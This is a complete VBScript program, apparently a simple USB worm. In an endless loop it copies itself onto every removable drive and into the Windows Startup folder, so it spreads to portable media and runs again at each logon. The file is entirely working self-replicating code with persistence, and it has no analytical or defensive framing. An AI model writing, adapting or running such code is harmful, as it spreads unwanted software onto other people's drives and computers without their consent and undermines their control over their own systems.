Option Explicit

Dim objFSO, objShell, strScriptPath, strDriveLetter

' Get the script file path
strScriptPath = WScript.ScriptFullName

' Create FileSystemObject and Shell objects
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

' Main loop to check for removable drive every 5 seconds
Do
    ' Get a list of drives
    Dim colDrives, objDrive
    Set colDrives = objFSO.Drives
    
    ' Check each drive
    For Each objDrive In colDrives
        If objDrive.DriveType = 1 Then ' Removable drive
            strDriveLetter = objDrive.DriveLetter
            
            ' Check if the script exists on the USB drive
            If Not objFSO.FileExists(strDriveLetter & ":\\" & objFSO.GetFileName(strScriptPath)) Then
                ' Copy script to the removable drive
                CopyScriptToUSB strScriptPath, strDriveLetter
            End If
        End If
    Next
    
    ' Check if the script exists in the startup folder
    If Not CheckIfScriptExistsInStartup() Then
        ' Copy script to the startup folder
        CopyScriptToStartupFolder strScriptPath
    End If
    
    ' Wait for 5 seconds
    WScript.Sleep 5000
Loop

' Function to copy the script to the USB drive
Sub CopyScriptToUSB(strSourcePath, strDriveLetter)
    Dim strDestinationPath
    
    ' Create destination path on the USB drive
    strDestinationPath = strDriveLetter & ":\\" & objFSO.GetFileName(strScriptPath)
    
    ' Copy the script file
    objFSO.CopyFile strSourcePath, strDestinationPath, True
    
    ' Display message
    MsgBox "Script copied to USB drive.", vbInformation
End Sub

' Function to check if the script exists in the startup folder
Function CheckIfScriptExistsInStartup()
    Dim strStartupFolder, strDestinationPath
    
    ' Get the startup folder path
    strStartupFolder = objShell.SpecialFolders("Startup")
    
    ' Create destination path in the startup folder
    strDestinationPath = strStartupFolder & "\\" & objFSO.GetFileName(strScriptPath)
    
    ' Check if the script file exists in the startup folder
    If objFSO.FileExists(strDestinationPath) Then
        CheckIfScriptExistsInStartup = True
    Else
        CheckIfScriptExistsInStartup = False
    End If
End Function

' Function to copy the script to the startup folder
Sub CopyScriptToStartupFolder(strSourcePath)
    Dim strStartupFolder, strDestinationPath
    
    ' Get the startup folder path
    strStartupFolder = objShell.SpecialFolders("Startup")
    
    ' Create destination path in the startup folder
    strDestinationPath = strStartupFolder & "\\" & objFSO.GetFileName(strSourcePath)
    
    ' Copy the script file to the startup folder
    objFSO.CopyFile strSourcePath, strDestinationPath, True
    
    ' Display message
    MsgBox "Script copied to Startup folder.", vbInformation
End Sub
